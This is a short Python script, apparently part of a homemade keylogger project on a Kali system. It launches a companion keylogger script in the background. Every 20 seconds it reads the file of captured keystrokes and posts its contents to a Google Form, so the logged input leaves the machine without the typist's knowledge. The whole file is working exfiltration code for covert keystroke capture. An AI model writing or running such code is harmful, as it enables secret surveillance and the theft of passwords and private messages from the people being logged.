#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/kali/Archive/Keylogger/keyloggerRemoteTest.py &")
time.sleep(1)

def send_request():
	form_input = open("/home/kali/Archive/Keylogger/keyboard_Input.txt")
	form_send = form_input.read()
	form_url="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdVoqWpwJ9VSLuHM9F8e5HxlIl9JompiEERqNO5WFE_w6W6zA/formResponse"
	form_data ={ 'entry.839337160': f"'{form_send}'"}
	r = requests.post(form_url, data=form_data)
	
def interval():
	global startlog
	if time.time() - 20 > startlog:
		print('its been 20 secs')
		send_request()
		startlog = time.time()
		
counter = 0
while True:
	counter += 1
	print(counter)
	interval()
	time.sleep(1)
